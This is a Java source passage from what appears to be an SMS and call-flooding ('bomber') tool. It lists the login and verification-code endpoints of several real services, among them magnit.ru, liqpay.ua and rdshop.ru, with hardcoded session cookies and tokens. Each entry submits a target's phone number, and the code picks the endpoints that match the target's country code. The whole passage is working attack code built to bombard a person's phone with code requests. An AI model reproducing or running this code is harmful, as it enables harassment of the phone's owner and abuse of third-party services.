                    request.header("Cookie", "_CIAN_GK=fed34d2d-0e0d-4363-80e1-db8007be7773; session_region_id=4777; __cf_bm=TfKpAqKCcOwCMtRx5Bbda7N58gNcyBsXws7c71T3bBY-1661249001-0-AaRhz3pFJnzJ8m1196Rw4lR8ZMhybYMc0ZWPvwpKt7uPxlQO8YraMKXJERORoHtsgZdhIh92S5qo4eu4tHYzfXU=; utm_source=mlsn; utm_campaign=web; utm_medium=301; login_mro_popup=1; _ga=GA1.2.647101164.1661249006; _gid=GA1.2.455236266.1661249006; sopr_utm=%7B%22utm_source%22%3A+%22mlsn%22%2C+%22utm_medium%22%3A+%22301%22%2C+%22utm_campaign%22%3A+%22web%22%7D; sopr_session=db64a7e8b3e24845; _dc_gtm_UA-30374201-1=1; lastSource=mlsn; uxfb_usertype=searcher; tmr_lvid=5b317c80cc3927428cb45330e4df4fcf; tmr_lvidTS=1661249006903; tmr_reqNum=2; _ym_uid=1661249007678488245; _ym_d=1661249007; uxs_uid=d520fb00-22ca-11ed-8717-8df5def2f0f4; _ym_isad=2; _ym_visorc=b; _gp10002511={\"utm\":\" - 74c06fb0\",\"hits\":1,\"vc\":1}; _gpVisits={\"isFirstVisitDomain\":true,\"todayD\":\"Tue % 20Aug % 2023 % 202022\",\"idContainer\":\"10002511\"}; afUserId=d0735a66-4c08-49e3-840d-63a1e4096166-p; adrdel=1; adrcid=AFfUu_aT3HlWd7sNWdMFs0w; AF_SYNC=1661249008900");

                    try {
                        return new JSONObject()
                                .put("phone", "+" + phone.toString())
                                .put("type", "authenticateCode")
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new FormService("https://new.moy.magnit.ru/local/ajax/login/", 7) {
                @Override
                public void buildBody(Phone phone) {
                    request.header("Cookie", "PHPSESSID=2kd309agmimij9tal6ent8uq3h; _ym_uid=1661249544448490865; _ym_d=1661249544; _gid=GA1.2.616542140.1661249544; _gat_UA-61230203-9=1; _gat_UA-61230203-3=1; _ym_isad=2; _ym_visorc=w; _clck=101hu5z|1|f49|0; _ga=GA1.4.423547847.1661249544; _gid=GA1.4.616542140.1661249544; _gat_UA-61230203-5=1; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; KFP_DID=fe822d3f-4a57-723d-2706-a9521f9bd17d; _clsk=1m7dkz8|1661249549863|2|1|m.clarity.ms/collect; _ga=GA1.2.423547847.1661249544; _ga_GW0P06R9HZ=GS1.1.1661249548.1.0.1661249554.0.0.0; oxxfgh=L!70f3663c-afc8-7e2d-2316-cda82e315cba#1#1800000#5000#1800000#12840");
                    request.header("X-Requested-With", "XMLHttpRequest");

                    builder.add("phone", format(phone.getPhone(), "+ 7 ( *** ) ***-**-**"));
                    builder.add("ksid", "L!70f3663c-afc8-7e2d-2316-cda82e315cba_0");
                }
            },

            new FormService("https://www.liqpay.ua/apiweb/login/start", 380) {
                @Override
                public void buildBody(Phone phone) {
                    request.header("Cookie", "_gcl_au=1.1.2000038126.1661250974; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2022-08-23%2013%3A36%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.liqpay.ua%2Fauthorization%3Freturn_to%3D%252Fuk%252Fadminbusiness%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2022-08-23%2013%3A36%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.liqpay.ua%2Fauthorization%3Freturn_to%3D%252Fuk%252Fadminbusiness%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F104.0.5112.102%20Safari%2F537.36%20Edg%2F104.0.1293.63; _ga_SC8SJ5GD85=GS1.1.1661250974.1.0.1661250974.0.0.0; _fbp=fb.1.1661250974723.798111670; _ga=GA1.2.804869749.1661250975; _gid=GA1.2.1515868995.1661250975; _dc_gtm_UA-213775397-1=1; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.liqpay.ua%2Fuk%2Flogin%2Flogin%2F1661250975005613_69027_PhMFILQwTvgiZrnm8B7X; _dc_gtm_UA-48226031-1=1");
                    request.header("-requested-with", "XMLHttpRequest");

                    builder.add("token", "1661250975005613_69027_PhMFILQwTvgiZrnm8B7X");
                    builder.add("phone", phone.toString());
                    builder.add("pagetoken", "1661250975005613_69027_PhMFILQwTvgiZrnm8B7X");
                    builder.add("checkouttoken", "1661250975005613_69027_PhMFILQwTvgiZrnm8B7X");
                    builder.add("language", "uk");
                }
            },

            new FormService("https://rdshop.ru/account/account/GetCodeInCall", 7) {
                @Override
                public void buildBody(Phone phone) {
                    request.header("Cookie", "roistat_is_need_listen_requests=0; roistat_is_save_data_in_cookie=1; PHPSESSID=e932d8b151811b7b31c562a2ec040ef1; subscribe=3; tmr_lvid=39118e12a2efafcb7c3ac16785d04687; tmr_lvidTS=1661321606737; _gcl_au=1.1.2068004334.1661321607; _ym_uid=1661321607609079142; _ym_d=1661321607; _gid=GA1.2.938340015.1661321608; roistat_visit=25973632; roistat_first_visit=25973632; roistat_visit_cookie_expire=1209600; _ym_isad=2; _dc_gtm_UA-87627642-1=1; _ym_visorc=w; roistat_cookies_to_resave=roistat_ab%2Croistat_ab_submit%2Croistat_visit; ___dc=ad4296fc-5739-4959-a059-2cdbea5636da; next=%5B%22test%22%5D; utm_metka=rdshop.ru%2Faccount%2Faccount%2Flogin; _ga_ZTB74EHJ4N=GS1.1.1661321607.1.1.1661321609.0.0.0; tmr_reqNum=9; _ga=GA1.2.2072790685.1661321607; _gali=Client_phone; tmr_detect=0%7C1661321611768");
                    request.header("x-requested-with", "XMLHttpRequest");

                    builder.add("phone", format(phone.getPhone(), "7(***)***-**-**"));
                }
            }
    };

    @Override
    public List<Service> getServices(String countryCode) {
        List<Service> usableServices = new ArrayList<>();

        int countryCodeNum = countryCode.isEmpty() ? 0 : Integer.parseInt(countryCode);
        for (Service service : services) {
            if (service.countryCodes == null || service.countryCodes.length == 0) {
                usableServices.add(service);
                continue;
            }
            for (final int i : service.countryCodes) {
                if (i == countryCodeNum) {
                    usableServices.add(service);
                    break;
                }
            }
        }

        return usableServices;
    }
}
